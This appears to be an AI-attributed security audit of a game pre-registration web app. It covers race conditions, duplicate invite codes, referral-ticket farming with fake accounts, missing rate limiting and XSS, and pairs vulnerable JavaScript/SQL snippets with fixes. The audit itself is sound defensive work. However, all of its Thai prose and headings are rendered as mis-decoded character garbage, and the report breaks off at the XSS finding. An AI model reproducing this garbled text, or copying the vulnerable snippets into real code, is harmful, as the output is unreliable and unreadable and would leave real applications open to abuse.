# üîê ‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢ - ‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå‡∏•‡∏á‡∏ó‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ô‡∏•‡πà‡∏ß‡∏á‡∏´‡∏ô‡πâ‡∏≤ Rank1 City

> **‡∏ß‡∏±‡∏ô‡∏ó‡∏µ‡πà‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö:** 6 ‡∏ò‡∏±‡∏ô‡∏ß‡∏≤‡∏Ñ‡∏° 2567  
> **‡∏ß‡∏±‡∏ô‡∏ó‡∏µ‡πà‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡∏•‡πà‡∏≤‡∏™‡∏∏‡∏î:** 6 ‡∏ò‡∏±‡∏ô‡∏ß‡∏≤‡∏Ñ‡∏° 2567 (14:50)  
> **‡∏ú‡∏π‡πâ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö:** Antigravity AI Security Analyst  
> **‡∏Å‡∏≤‡∏£‡∏à‡∏≥‡∏•‡∏≠‡∏á:** 5,000 ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏Å‡∏±‡∏ô  
> **‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞:** ‚úÖ ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡∏õ‡∏±‡∏ç‡∏´‡∏≤‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÅ‡∏•‡πâ‡∏ß

---

## üìä ‡∏™‡∏£‡∏∏‡∏õ‡∏†‡∏≤‡∏û‡∏£‡∏ß‡∏°

### ‡∏™‡∏∏‡∏Ç‡∏†‡∏≤‡∏û‡πÇ‡∏î‡∏¢‡∏£‡∏ß‡∏°: **‚úÖ ‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢ - ‡∏û‡∏£‡πâ‡∏≠‡∏°‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô**

| ‡∏î‡πâ‡∏≤‡∏ô | ‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞ | ‡∏£‡∏∞‡∏î‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏™‡∏µ‡πà‡∏¢‡∏á |
|------|--------|----------------|
| ‡∏Å‡∏≤‡∏£‡∏¢‡∏∑‡∏ô‡∏¢‡∏±‡∏ô‡∏ï‡∏±‡∏ß‡∏ï‡∏ô (Authentication) | ‚úÖ ‡∏î‡∏µ | ‡∏ï‡πà‡∏≥ |
| ‡∏Å‡∏≤‡∏£‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏°‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå (Authorization) | ‚úÖ ‡∏î‡∏µ | ‡∏ï‡πà‡∏≥ |
| ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• (SQL Injection) | ‚úÖ ‡∏î‡∏µ | ‡∏ï‡πà‡∏≥ |
| Race Conditions | ‚úÖ **‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡πÅ‡∏•‡πâ‡∏ß** | ‡∏ï‡πà‡∏≥ |
| Rate Limiting | ‚úÖ **‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡πÅ‡∏•‡πâ‡∏ß** | ‡∏ï‡πà‡∏≥ |
| ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Input | ‚úÖ **‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡πÅ‡∏•‡πâ‡∏ß** | ‡∏ï‡πà‡∏≥ |
| ‡∏Å‡∏≤‡∏£‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô XSS | ‚úÖ **‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡πÅ‡∏•‡πâ‡∏ß** | ‡∏ï‡πà‡∏≥ |
| ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì‡πå‡∏Ç‡∏≠‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• | ‚úÖ **‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡πÅ‡∏•‡πâ‡∏ß** | ‡∏ï‡πà‡∏≥ |

### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤‡∏ó‡∏µ‡πà‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡πÅ‡∏•‡πâ‡∏ß:
1. ‚úÖ **Race Conditions** - ‡πÉ‡∏ä‡πâ Atomic UPDATE ‡∏û‡∏£‡πâ‡∏≠‡∏°‡πÄ‡∏á‡∏∑‡πà‡∏≠‡∏ô‡πÑ‡∏Ç
2. ‚úÖ **‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏£‡∏∞‡∏ö‡∏ö‡πÄ‡∏ä‡∏¥‡∏ç‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î** - ‡∏à‡∏≥‡∏Å‡∏±‡∏î 3 referrals ‡∏ï‡πà‡∏≠ IP
3. ‚úÖ **Rate Limiting** - ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÅ‡∏•‡πâ‡∏ß‡πÉ‡∏ô API ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î
4. ‚úÖ **XSS ‡∏ú‡πà‡∏≤‡∏ô logo_url ‡πÅ‡∏•‡∏∞ motd** - Whitelist domains + Strip HTML
5. ‚úÖ **member_count sync** - ‡πÉ‡∏ä‡πâ Stored Procedure
6. ‚úÖ **Rate Limiting ‡∏Ñ‡∏£‡∏ö‡∏ó‡∏∏‡∏Å API** - ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÉ‡∏ô gang/members, family/members, user/check, admin
7. ‚úÖ **Console Logs** - ‡∏•‡∏ö sensitive data ‡∏à‡∏≤‡∏Å logs

---

## üîç ‡∏£‡∏≤‡∏¢‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏õ‡∏±‡∏ç‡∏´‡∏≤‡∏ó‡∏µ‡πà‡∏û‡∏ö

---

### üî¥ ‡∏ß‡∏¥‡∏Å‡∏§‡∏ï / P0 - ‡∏ï‡πâ‡∏≠‡∏á‡πÅ‡∏Å‡πâ‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏õ‡∏¥‡∏î‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #1: Race Condition ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡πÅ‡∏Å‡πä‡∏á/‡∏Ñ‡∏£‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡∏ß

**‡πÑ‡∏ü‡∏•‡πå:** `app/api/gang/route.js` (‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 130-158), `app/api/family/route.js` (‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 91-119)

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏£‡∏∞‡∏ö‡∏ö‡πÅ‡∏Å‡πä‡∏á / ‡∏Ñ‡∏£‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡∏ß

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢ / ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì‡πå‡∏Ç‡∏≠‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üî¥ **‡∏ß‡∏¥‡∏Å‡∏§‡∏ï**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå (5,000 ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ):**
```
‡πÄ‡∏°‡∏∑‡πà‡∏≠ 100 ‡∏Ñ‡∏ô‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡πÅ‡∏Å‡πä‡∏á‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏Å‡∏±‡∏ô (max_members = 25):

1. ‡∏ó‡∏±‡πâ‡∏á 100 ‡∏Ñ‡∏ô query: SELECT member_count ‚Üí ‡πÑ‡∏î‡πâ 24
2. ‡∏ó‡∏±‡πâ‡∏á 100 ‡∏Ñ‡∏ô ‡∏ï‡∏£‡∏ß‡∏à: 24 < 25 ‚Üí ‡∏ú‡πà‡∏≤‡∏ô
3. ‡∏ó‡∏±‡πâ‡∏á 100 ‡∏Ñ‡∏ô ‡∏ó‡∏≥: UPDATE member_count = member_count + 1
4. ‡∏ó‡∏±‡πâ‡∏á 100 ‡∏Ñ‡∏ô ‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
5. ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå: ‡πÅ‡∏Å‡πä‡∏á‡∏°‡∏µ 124 ‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å ‡πÅ‡∏ó‡∏ô‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÄ‡∏õ‡πá‡∏ô 25!
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏ (‡πÇ‡∏Ñ‡πâ‡∏î):**
```javascript
// ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 137-143 ‡πÉ‡∏ô gang/route.js
const [gang] = await connection.query(
    'SELECT id, member_count, max_members FROM gangs WHERE gang_code = ?',
    [inviteCode]
);
if (gang[0].member_count >= gang[0].max_members) throw new Error('Gang is full');

// ‡πÑ‡∏°‡πà‡∏°‡∏µ LOCK! ‡∏£‡∏∞‡∏´‡∏ß‡πà‡∏≤‡∏á SELECT ‡πÅ‡∏•‡∏∞ UPDATE ‡∏Ñ‡∏ô‡∏≠‡∏∑‡πà‡∏ô‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏î‡πâ
await connection.query(
    'UPDATE gangs SET member_count = member_count + 1 WHERE id = ?',
    [gang[0].id]
);
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡πÅ‡∏Å‡πä‡∏á/‡∏Ñ‡∏£‡∏≠‡∏ö‡∏Ñ‡∏£‡∏±‡∏ß ‡∏°‡∏µ‡∏™‡∏°‡∏≤‡∏ä‡∏¥‡∏Å‡πÄ‡∏Å‡∏¥‡∏ô‡∏Å‡∏≥‡∏´‡∏ô‡∏î‡πÑ‡∏î‡πâ
- ‡πÄ‡∏≠‡∏≤‡πÄ‡∏õ‡∏£‡∏µ‡∏¢‡∏ö‡∏Å‡∏•‡∏∏‡πà‡∏°‡∏≠‡∏∑‡πà‡∏ô
- ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏ô‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡∏ß‡∏¥‡∏ò‡∏µ‡∏ó‡∏µ‡πà 1: ‡πÉ‡∏ä‡πâ UPDATE ‡πÅ‡∏ö‡∏ö atomic ‡∏û‡∏£‡πâ‡∏≠‡∏°‡πÄ‡∏á‡∏∑‡πà‡∏≠‡∏ô‡πÑ‡∏Ç
const [result] = await connection.query(
    `UPDATE gangs 
     SET member_count = member_count + 1 
     WHERE gang_code = ? AND member_count < max_members`,
    [inviteCode]
);

if (result.affectedRows === 0) {
    throw new Error('‡πÅ‡∏Å‡πä‡∏á‡πÄ‡∏ï‡πá‡∏°‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà‡∏û‡∏ö');
}

// ‡∏ß‡∏¥‡∏ò‡∏µ‡∏ó‡∏µ‡πà 2: ‡πÉ‡∏ä‡πâ SELECT ... FOR UPDATE
await connection.query('SET TRANSACTION ISOLATION LEVEL SERIALIZABLE');
const [gang] = await connection.query(
    'SELECT id, member_count, max_members FROM gangs WHERE gang_code = ? FOR UPDATE',
    [inviteCode]
);
```

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #2: ‡∏£‡∏´‡∏±‡∏™‡πÅ‡∏Å‡πä‡∏á‡∏ã‡πâ‡∏≥‡πÑ‡∏î‡πâ

**‡πÑ‡∏ü‡∏•‡πå:** `app/api/gang/route.js` (‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 72-82)

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏£‡∏∞‡∏ö‡∏ö‡πÅ‡∏Å‡πä‡∏á

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏°‡∏ö‡∏π‡∏£‡∏ì‡πå‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üî¥ **‡∏ß‡∏¥‡∏Å‡∏§‡∏ï**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå (5,000 ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ):**
```
‡∏™‡∏≠‡∏á‡∏Ñ‡∏ô‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÅ‡∏Å‡πä‡∏á‡πÉ‡∏ô‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô:
1. ‡∏Ñ‡∏ô A: generateGangCode() ‚Üí "GANG-ABCD"
2. ‡∏Ñ‡∏ô B: generateGangCode() ‚Üí "GANG-ABCD" (‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡∏Å‡∏±‡∏ô!)
3. ‡∏ó‡∏±‡πâ‡∏á‡∏™‡∏≠‡∏á INSERT ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
4. ‡∏™‡∏≠‡∏á‡πÅ‡∏Å‡πä‡∏á‡πÉ‡∏ä‡πâ invite_code ‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô!
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏ (‡πÇ‡∏Ñ‡πâ‡∏î):**
```javascript
// ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 76-81: ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ã‡πâ‡∏≥‡∏Å‡πà‡∏≠‡∏ô insert!
let newGangCode = generateGangCode();

// Insert ‡∏ï‡∏£‡∏á‡πÜ ‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡πÄ‡∏ä‡πá‡∏Ñ‡∏ß‡πà‡∏≤‡∏°‡∏µ‡∏≠‡∏¢‡∏π‡πà‡πÅ‡∏•‡πâ‡∏ß‡∏´‡∏£‡∏∑‡∏≠‡πÄ‡∏õ‡∏•‡πà‡∏≤
const [result] = await connection.query(
    'INSERT INTO gangs (name, gang_code, invite_code, ...) VALUES (?, ?, ?, ...)',
    [name, newGangCode, newGangCode, ...]
);
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡∏£‡∏´‡∏±‡∏™‡πÅ‡∏Å‡πä‡∏á‡∏ã‡πâ‡∏≥‡∏Å‡∏±‡∏ô
- ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°‡πÅ‡∏Å‡πä‡∏á‡∏ú‡∏¥‡∏î
- ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÄ‡∏™‡∏µ‡∏¢‡∏´‡∏≤‡∏¢

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏£‡∏´‡∏±‡∏™‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡∏ã‡πâ‡∏≥‡∏î‡πâ‡∏ß‡∏¢ retry loop
let newGangCode;
let isUnique = false;
let attempts = 0;

while (!isUnique && attempts < 10) {
    newGangCode = generateGangCode();
    const [existing] = await connection.query(
        'SELECT id FROM gangs WHERE gang_code = ?',
        [newGangCode]
    );
    if (existing.length === 0) isUnique = true;
    attempts++;
}

if (!isUnique) throw new Error('‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏£‡∏´‡∏±‡∏™‡πÅ‡∏Å‡πä‡∏á‡∏ó‡∏µ‡πà‡πÑ‡∏°‡πà‡∏ã‡πâ‡∏≥‡πÑ‡∏î‡πâ');
```

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #3: ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏£‡∏∞‡∏ö‡∏ö‡πÄ‡∏ä‡∏¥‡∏ç‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î - ‡∏ü‡∏≤‡∏£‡πå‡∏° Ticket ‡πÑ‡∏î‡πâ

**‡πÑ‡∏ü‡∏•‡πå:** `app/api/preregister/route.js` (‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 59-105)

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏£‡∏∞‡∏ö‡∏ö‡πÄ‡∏ä‡∏¥‡∏ç‡πÅ‡∏•‡∏∞ Ticket

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏Ç‡πâ‡∏≠‡∏ú‡∏¥‡∏î‡∏û‡∏•‡∏≤‡∏î‡∏ï‡∏£‡∏£‡∏Å‡∏∞ / ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üî¥ **‡∏ß‡∏¥‡∏Å‡∏§‡∏ï**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå:**
```
‡∏ú‡∏π‡πâ‡πÑ‡∏°‡πà‡∏´‡∏ß‡∏±‡∏á‡∏î‡∏µ‡∏°‡∏µ‡∏´‡∏•‡∏≤‡∏¢‡∏ö‡∏±‡∏ç‡∏ä‡∏µ Discord:
1. ‡∏ö‡∏±‡∏ç‡∏ä‡∏µ A ‡∏•‡∏á‡∏ó‡∏∞‡πÄ‡∏ö‡∏µ‡∏¢‡∏ô, ‡πÑ‡∏î‡πâ‡∏£‡∏´‡∏±‡∏™ "R1-AAAAAA"
2. ‡∏ö‡∏±‡∏ç‡∏ä‡∏µ B ‡πÉ‡∏ä‡πâ‡∏£‡∏´‡∏±‡∏™ "R1-AAAAAA" ‚Üí A ‡πÑ‡∏î‡πâ +1 ticket
3. ‡∏ö‡∏±‡∏ç‡∏ä‡∏µ C ‡πÉ‡∏ä‡πâ‡∏£‡∏´‡∏±‡∏™ "R1-AAAAAA" ‚Üí A ‡πÑ‡∏î‡πâ +1 ticket
4. ‡∏ó‡∏≥‡∏ã‡πâ‡∏≥‡∏Å‡∏±‡∏ö 100 ‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏õ‡∏•‡∏≠‡∏° ‚Üí A ‡πÑ‡∏î‡πâ 100 tickets!
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏ (‡πÇ‡∏Ñ‡πâ‡∏î):**
```javascript
// ‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 65: ‡πÄ‡∏ä‡πá‡∏Ñ‡πÅ‡∏Ñ‡πà‡∏ß‡πà‡∏≤‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á ‡πÑ‡∏°‡πà‡πÄ‡∏ä‡πá‡∏Ñ IP
if (referrer.length > 0 && referrer[0].discord_id !== discordId) {
    validReferredBy = referralCodeInput;
    
    // ‡πÉ‡∏´‡πâ ticket ‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î
    await connection.query(
        'UPDATE preregistrations SET invite_count = invite_count + 1, ticket_count = ticket_count + 1 WHERE referral_code = ?',
        [validReferredBy]
    );
}
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡∏ü‡∏≤‡∏£‡πå‡∏° ticket ‡πÑ‡∏î‡πâ‡πÑ‡∏°‡πà‡∏à‡∏≥‡∏Å‡∏±‡∏î
- ‡πÑ‡∏î‡πâ‡πÄ‡∏õ‡∏£‡∏µ‡∏¢‡∏ö‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÅ‡∏à‡∏Å‡∏£‡∏≤‡∏á‡∏ß‡∏±‡∏•‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÑ‡∏°‡πà‡∏¢‡∏∏‡∏ï‡∏¥‡∏ò‡∏£‡∏£‡∏°
- ‡∏•‡∏î‡∏Ñ‡∏∏‡∏ì‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏¥‡∏ç‡∏à‡∏£‡∏¥‡∏á‡πÜ

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
// ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏ï‡∏≤‡∏° IP
const [ipCheck] = await connection.query(
    'SELECT COUNT(*) as count FROM preregistrations WHERE ip_address = ? AND referred_by IS NOT NULL',
    [ipAddress]
);

if (ipCheck[0].count >= 3) { // ‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î 3 referrals ‡∏ï‡πà‡∏≠ IP
    validReferredBy = null; // ‡πÑ‡∏°‡πà‡∏ô‡∏±‡∏ö referral ‡∏à‡∏≤‡∏Å IP ‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô
    console.log(`‡∏ï‡∏£‡∏ß‡∏à‡∏û‡∏ö‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î‡∏à‡∏≤‡∏Å IP: ${ipAddress}`);
}

// ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏ï‡∏≤‡∏°‡πÄ‡∏ß‡∏•‡∏≤‡∏î‡πâ‡∏ß‡∏¢
// ‡∏û‡∏¥‡∏à‡∏≤‡∏£‡∏ì‡∏≤‡πÄ‡∏ä‡πá‡∏Ñ‡∏≠‡∏≤‡∏¢‡∏∏‡∏ö‡∏±‡∏ç‡∏ä‡∏µ Discord (‡∏ñ‡πâ‡∏≤ API ‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö)
```

---

### üü† ‡∏™‡∏π‡∏á / P1 - ‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç‡∏´‡∏•‡∏±‡∏á‡πÄ‡∏õ‡∏¥‡∏î‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #4: ‡πÑ‡∏°‡πà‡∏°‡∏µ Rate Limiting ‡πÉ‡∏ô Gang/Family APIs

**‡πÑ‡∏ü‡∏•‡πå:** `app/api/gang/route.js`, `app/api/family/route.js`

**‡∏î‡πâ‡∏≤‡∏ô:** ‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û / ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢

**‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó:** ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢ / ‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏™‡∏µ‡πà‡∏¢‡∏á DDoS

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏∏‡∏ô‡πÅ‡∏£‡∏á:** üü† **‡∏™‡∏π‡∏á**

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå (5,000 ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ):**
```
‡∏ú‡∏π‡πâ‡πÇ‡∏à‡∏°‡∏ï‡∏µ spam POST /api/gang ‡∏î‡πâ‡∏ß‡∏¢ action='join':
- 1000 requests ‡∏ï‡πà‡∏≠‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
- Connection pool ‡∏Ç‡∏≠‡∏á‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏´‡∏°‡∏î
- ‡πÄ‡∏ã‡∏¥‡∏£‡πå‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå‡πÑ‡∏°‡πà‡∏ï‡∏≠‡∏ö‡∏™‡∏ô‡∏≠‡∏á
- ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏à‡∏£‡∏¥‡∏á‡πÄ‡∏Ç‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ
```

**‡∏™‡∏≤‡πÄ‡∏´‡∏ï‡∏∏:**
```javascript
// Gang route ‡πÑ‡∏°‡πà‡∏°‡∏µ rate limiting!
export async function POST(request) {
    // ‡∏Ç‡∏≤‡∏î: rateLimit(ip, limit, windowMs)
    const session = await getServerSession(authOptions);
    ...
}
```

**‡∏ú‡∏•‡∏Å‡∏£‡∏∞‡∏ó‡∏ö:**
- ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà DoS
- ‡∏ê‡∏≤‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏£‡∏±‡∏ö‡∏†‡∏≤‡∏£‡∏∞‡∏´‡∏ô‡∏±‡∏Å‡πÄ‡∏Å‡∏¥‡∏ô
- Connection pool ‡∏´‡∏°‡∏î

**‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:**
```javascript
import { rateLimit } from '@/lib/rate-limit';

export async function POST(request) {
    const ip = request.headers.get("x-forwarded-for") || "unknown";
    
    if (!rateLimit(ip, 10, 60000)) { // 10 requests ‡∏ï‡πà‡∏≠‡∏ô‡∏≤‡∏ó‡∏µ
        return NextResponse.json({ error: '‡∏Ñ‡∏≥‡∏Ç‡∏≠‡∏°‡∏≤‡∏Å‡πÄ‡∏Å‡∏¥‡∏ô‡πÑ‡∏õ' }, { status: 429 });
    }
    
    // ... ‡πÇ‡∏Ñ‡πâ‡∏î‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏•‡∏∑‡∏≠
}
```

---

#### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤ #5: XSS ‡∏ú‡πà‡∏≤‡∏ô logo_url ‡πÅ‡∏•‡∏∞ motd

**‡πÑ‡∏ü‡∏•‡πå:** `components/GangManager.js` (‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î 482-487), `components/FamilyManager.js`

